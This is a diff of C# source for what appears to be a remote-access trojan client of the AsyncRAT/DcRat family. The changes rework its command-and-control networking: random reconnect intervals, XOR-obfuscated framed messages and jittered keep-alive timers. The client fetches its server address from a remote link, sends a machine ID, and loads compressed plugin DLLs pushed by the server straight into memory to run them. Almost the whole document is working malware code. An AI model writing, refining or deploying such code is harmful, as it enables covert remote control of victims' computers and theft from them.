@@ -33,7 +33,7 @@ namespace Client
         public static readonly string Group = "Default";
         public static readonly string XorKey = "qwqdanchun";
 
-        public static string HWID = "";
+        public static string HWID;
         #endregion
 
         static void Main(string[] args)
@@ -43,22 +43,23 @@ namespace Client
             InitializeClient();
             while (true)
             {
-                Thread.Sleep(1000);
+                if (!IsConnected)
+                    Reconnect();
+                Thread.Sleep(new Random().Next(5000));
             }
         }
 
         #region Socket
-
-        public static Socket TcpClient { get; set; } //Main socket
-        private static byte[] Buffer { get; set; } //Socket buffer
-        private static long HeaderSize { get; set; } //Recevied size
-        private static long Offset { get; set; } // Buffer location
-        private static Timer KeepAlive { get; set; } //Send Performance
-        public static bool IsConnected { get; set; } //Check socket status
-        private static object SendSync { get; } = new object(); //Sync send
-        private static Timer Ping { get; set; } //Send ping interval
-        public static int Interval { get; set; } //ping value
+        public static Socket Client { get; set; }
+        private static byte[] Buffer { get; set; }
+        private static long Buffersize { get; set; }
+        private static MemoryStream MS { get; set; }
+        public static bool IsConnected { get; set; }
+        private static object SendSync { get; } = new object();
         public static bool ActivatePong { get; set; }
+        private static Timer Ping { get; set; }
+        public static int Interval { get; set; }
+        private static Timer KeepAlive { get; set; }
 
         public static List<MsgPack> Packs = new List<MsgPack>();
 
@@ -67,7 +68,7 @@ namespace Client
             try
             {
 
-                TcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
+                Client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                 {
                     ReceiveBufferSize = 50 * 1024,
                     SendBufferSize = 50 * 1024,
@@ -83,15 +84,15 @@ namespace Client
                         {
                             try
                             {
-                                TcpClient.Connect(theaddress, Port);
-                                if (TcpClient.Connected) break;
+                                Client.Connect(theaddress, Port);
+                                if (Client.Connected) break;
                             }
                             catch { }
                         }
                     }
                     else
                     {
-                        TcpClient.Connect(Host, Port);
+                        Client.Connect(Host, Port);
                     }
                 }
                 else
@@ -102,33 +103,30 @@ namespace Client
                         wc.Credentials = networkCredential;
                         string resp = wc.DownloadString(Link);
                         string[] spl = resp.Split(new[] { ":" }, StringSplitOptions.None);
-                        TcpClient.Connect(spl[0], Convert.ToInt32(spl[new Random().Next(1, spl.Length)]));
+                        Client.Connect(spl[0], Convert.ToInt32(spl[new Random().Next(1, spl.Length)]));
                     }
                 }
 
-                if (TcpClient.Connected)
+                if (Client.Connected)
                 {
                     IsConnected = true;
-                    HeaderSize = 4;
-                    Buffer = new byte[HeaderSize];
-                    Offset = 0;
+                    Buffer = new byte[4];
+                    MS = new MemoryStream();
                     Send(SendInfo());
                     Interval = 0;
-                    ActivatePong = false;
                     KeepAlive = new Timer(new TimerCallback(KeepAlivePacket), null, new Random().Next(10 * 1000, 15 * 1000), new Random().Next(10 * 1000, 15 * 1000));
                     Ping = new Timer(new TimerCallback(Pong), null, 1, 1);
-                    TcpClient.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
+                    Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
                 }
                 else
                 {
-                    Reconnect();
+                    IsConnected = false;
                     return;
                 }
             }
             catch
             {
-                Thread.Sleep(new Random().Next(1 * 1000, 6 * 1000));
-                Reconnect();
+                IsConnected = false;
                 return;
             }
         }
@@ -140,91 +138,77 @@ namespace Client
 
         public static void Reconnect()
         {
-            if (TcpClient.Connected) return;
-
 
             try
             {
-                Ping?.Dispose();
                 KeepAlive?.Dispose();
-                if (TcpClient != null)
+                Ping?.Dispose();
+                if (Client != null)
                 {
-                    TcpClient.Close();
-                    TcpClient.Dispose();
+                    Client.Close();
+                    Client.Dispose();
                 }
+                MS?.Dispose();
             }
-            catch { }
-            InitializeClient();
-            IsConnected = false;
+            finally
+            {
+                InitializeClient();
+            }
         }
 
-        public static void ReadServertData(IAsyncResult ar) //Socket read/recevie
+        public static void ReadServertData(IAsyncResult ar)
         {
             try
             {
-                if (!TcpClient.Connected || !IsConnected)
+                if (!Client.Connected || !IsConnected)
                 {
-                    Reconnect();
+                    IsConnected = false;
                     return;
                 }
-                int recevied = TcpClient.EndReceive(ar);
-                if (recevied > 0)
+
+                int recevied = Client.EndReceive(ar);
+                if (recevied == 4)
                 {
-                    Offset += recevied;
-                    HeaderSize -= recevied;
-                    if (HeaderSize == 0)
+                    MS.Write(Buffer, 0, recevied);
+                    Buffersize = BitConverter.ToInt32(MS.ToArray(), 0);
+                    Debug.WriteLine("/// Client Buffersize " + Buffersize.ToString() + " Bytes  ///");
+                    MS.Dispose();
+                    MS = new MemoryStream();
+                    if (Buffersize > 0)
                     {
-                        HeaderSize = BitConverter.ToInt32(Buffer, 0);
-                        //Debug.WriteLine("/// Client Buffersize " + HeaderSize.ToString() + " Bytes  ///");
-                        if (HeaderSize > 0)
+                        Buffer = new byte[Buffersize];
+                        while (MS.Length != Buffersize)
                         {
-                            Offset = 0;
-                            Buffer = new byte[HeaderSize];
-                            while (HeaderSize > 0)
+                            int rc = Client.Receive(Buffer, 0, Buffer.Length, SocketFlags.None);
+                            if (rc == 0)
                             {
-                                int rc = TcpClient.Receive(Buffer, 0, Buffer.Length, SocketFlags.None);
-                                if (rc <= 0)
-                                {
-                                    Reconnect();
-                                    return;
-                                }
-                                Offset += rc;
-                                HeaderSize -= rc;
-                                if (HeaderSize < 0)
-                                {
-                                    Reconnect();
-                                    return;
-                                }
+                                IsConnected = false;
+                                return;
                             }
-                            Thread thread = new Thread(new ParameterizedThreadStart(Read));
-                            thread.Start(Buffer);
-                            Offset = 0;
-                            HeaderSize = 4;
-                            Buffer = new byte[HeaderSize];
+                            MS.Write(Buffer, 0, rc);
+                            Buffer = new byte[Buffersize - MS.Length];
+                        }
+                        if (MS.Length == Buffersize)
+                        {
+                            ThreadPool.QueueUserWorkItem(Read, MS.ToArray());
+                            Buffer = new byte[4];
+                            MS.Dispose();
+                            MS = new MemoryStream();
                         }
                         else
-                        {
-                            HeaderSize = 4;
-                            Buffer = new byte[HeaderSize];
-                            Offset = 0;
-                        }
+                            Buffer = new byte[Buffersize - MS.Length];
                     }
-                    else if (HeaderSize < 0)
-                    {
-                        Reconnect();
-                        return;
-                    }
-                    TcpClient.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
+                    Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
                 }
                 else
                 {
-                    Reconnect();
+                    IsConnected = false;
                     return;
                 }
             }
             catch
             {
-                Reconnect();
+                IsConnected = false;
                 return;
             }
         }
@@ -235,21 +219,23 @@ namespace Client
             {
                 try
                 {
-                    if (!IsConnected)
+                    if (!Client.Connected || !IsConnected)
                     {
+                        IsConnected = false;
                         return;
                     }
+                    if (msg == null) return;
 
                     byte[] buffer = Xor((byte[])msg);
                     byte[] buffersize = BitConverter.GetBytes(buffer.Length);
 
-                    TcpClient.Poll(-1, SelectMode.SelectWrite);
-                    TcpClient.Send(buffersize, 0, buffersize.Length, SocketFlags.None);
-                    TcpClient.Send(buffer, 0, buffer.Length, SocketFlags.None);
+                    Client.Poll(-1, SelectMode.SelectWrite);
+                    Client.Send(buffersize, 0, buffersize.Length, SocketFlags.None);
+                    Client.Send(buffer, 0, buffer.Length, SocketFlags.None);
                 }
                 catch
                 {
-                    Reconnect();
+                    IsConnected = false;
                     return;
                 }
             }
@@ -356,7 +342,7 @@ namespace Client
             Assembly assembly = AppDomain.CurrentDomain.Load(Zip.Decompress(GetValue(unpack_msgpack.ForcePathObject("Dll").AsString)));
             Type type = assembly.GetType("Plugin.Plugin");
             dynamic instance = Activator.CreateInstance(type);
-            instance.Run(TcpClient, HWID, unpack_msgpack.ForcePathObject("Msgpack").GetAsBytes(), currentApp);
+            instance.Run(Client, HWID, unpack_msgpack.ForcePathObject("Msgpack").GetAsBytes(), currentApp);
             Received();
         }
 
